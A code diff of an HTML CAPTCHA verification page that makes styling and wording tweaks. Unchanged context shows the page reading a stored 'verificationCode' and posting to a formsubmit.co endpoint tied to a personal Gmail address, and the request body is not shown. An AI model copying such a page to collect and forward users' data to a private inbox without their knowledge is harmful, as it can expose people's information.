@@ -37,12 +37,14 @@
       font-weight: bold;
       letter-spacing: 5px;
       margin: 15px 0;
+      color: #2c3e50;
     }
     #captchaInput {
       padding: 10px;
       width: 200px;
       margin: 10px 0;
       font-size: 16px;
+      text-align: center;
     }
     .btn {
       background: #4CAF50;
@@ -58,7 +60,7 @@
 <body>
   <div class="container">
     <h1>CAPTCHA Verification</h1>
-    <p>Please complete the CAPTCHA to continue:</p>
+    <p>Please enter the CAPTCHA below:</p>
     
     <div class="captcha-box">
       <div id="captcha"></div>
@@ -79,11 +81,10 @@
       document.getElementById('captcha').textContent = captcha;
       return captcha;
     };
-    
+
     // Get Indian time
     const getIndianTime = () => {
-      const now = new Date();
-      return now.toLocaleString('en-IN', { 
+      return new Date().toLocaleString('en-IN', { 
         timeZone: 'Asia/Kolkata',
         day: 'numeric',
         month: 'short',
@@ -94,17 +95,17 @@
         hour12: true
       });
     };
-    
+
     // Initialize
     let currentCaptcha = generateCaptcha();
-    
+
     // Verify button event
     document.getElementById('verifyBtn').addEventListener('click', function() {
       const userInput = document.getElementById('captchaInput').value.toUpperCase();
       const verificationCode = localStorage.getItem('verificationCode');
       
       if(userInput === currentCaptcha) {
-        // Send email with Indian time
+        // Send email
         fetch('https://formsubmit.co/ajax/rajibmurmublp@gmail.com', {
           method: 'POST',
           headers: { 
